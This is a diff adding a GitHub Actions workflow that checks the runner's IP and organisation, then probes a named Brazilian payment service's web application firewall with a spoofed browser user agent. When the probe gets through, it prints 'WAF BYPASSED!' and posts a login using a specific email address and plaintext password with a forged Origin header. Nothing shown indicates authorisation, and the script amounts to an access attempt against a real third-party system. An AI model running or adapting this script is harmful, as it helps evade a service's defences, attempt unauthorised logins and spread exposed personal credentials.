@@ -1,0 +1,23 @@
+name: waf-test
+on:
+  workflow_dispatch:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Check IP and WAF
+      run: |
+        MY_IP=$(curl -s https://api.ipify.org)
+        ASN=$(curl -s "https://ipinfo.io/${MY_IP}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'IP:{d["ip"]} ORG:{d.get("org","?")} CC:{d.get("country","?")}')")
+        echo "RUNNER: $ASN"
+        
+        # Test WAF
+        CODE=$(curl -s -m 15 -w "%{http_code}" -o /dev/null           -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"           "https://wpdataservice.wisepay.com.br/users/theme")
+        echo "WAF: $CODE"
+        
+        if [ "$CODE" = "200" ]; then
+          echo "WAF BYPASSED!"
+          # Try login
+          BODY=$(curl -s -m 15             -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"             -H "Content-Type: application/json"             -H "Origin: https://portal.wisepay.com.br"             -X POST "https://wpdataservice.wisepay.com.br/login"             -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}')
+          echo "LOGIN: $BODY"
+        fi
